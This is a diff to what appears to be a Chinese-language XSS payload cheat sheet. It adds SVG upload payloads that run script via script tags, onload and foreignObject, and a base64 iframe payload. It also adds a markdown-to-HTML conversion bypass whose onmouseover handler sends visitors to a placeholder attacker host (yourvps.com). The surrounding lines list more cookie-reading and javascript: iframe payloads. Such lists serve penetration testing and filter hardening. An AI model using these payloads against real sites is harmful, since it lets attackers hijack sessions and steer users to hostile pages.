@@ -103,6 +103,33 @@ jquery sourceMappingURL
 ---------------------------------------------------
     ``"><img src=x onerror=alert(document.cookie)>.gif``
 
+svg图片上传
+---------------------------------------------------
+::
+
+    Content-Type: image/svg+xml
+    Content-Type: text/xml
+
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <script>alert(document.cookie)</script>
+    </svg>
+
+::
+
+    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
+        <rect width="100" height="100" fill="red" />
+    </svg>
+
+::
+
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <foreignObject>
+            <html xmlns="http://www.w3.org/1999/xhtml">
+            <body onload="alert(1)"/>
+            </html>
+        </foreignObject>
+    </svg>
+
 过期的payload
 ---------------------------------------------------
 - src=javascript:alert基本不可以用
@@ -130,6 +157,12 @@ markdown
     [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
     ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
 
+富文本-文档转换
+---------------------------------------------------
++ 原理：破坏转换过程逻辑。
++ markdown转html标签
+    - 转化前： ``[ hax ](http://hax//onmouseover=location='https://yourvps.com/hack.html';"`hax`zzz)``
+    - 转换后： ``<a href="&lt:a href=" http:="" hax="" onmouseover="location='https://yourvps.com/hack.html';&quot:&quot;" target="_blank" rel="noopener noreferrer">``
 
 iframe
 ---------------------------------------------------
@@ -147,6 +180,7 @@ iframe
 - ``<iframe src=javascript:alert(1)></iframe>``
 - ``<iframe src="data:text/html,<iframe src=javascript:alert('M')></iframe>"></iframe>``
 - ``<iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``
+- ``<iframe src=data:image/png;base64,PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==></iframe>``
 - ``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``
 - ``<iframe src=https://baidu.com width=1366 height=768></iframe>``
 - ``<iframe src=javascript:alert(1) width=1366 height=768></iframe``
